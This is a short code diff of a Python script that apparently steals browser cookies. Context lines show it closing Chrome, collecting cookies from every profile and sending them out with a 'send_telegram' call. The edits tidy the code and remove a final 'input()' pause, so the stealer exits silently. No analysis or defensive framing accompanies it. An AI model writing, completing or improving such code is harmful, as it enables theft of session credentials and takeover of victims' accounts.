@@ -22,7 +22,7 @@ def install_libraries():
         for lib in required_libs:
             if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                 subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
-    except subprocess.CalledProcessError as e:
+    except subprocess.CalledProcessError:
         sys.exit(1)
 
 def close_chrome():
@@ -86,4 +86,3 @@ if __name__ == "__main__":
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
-    input()
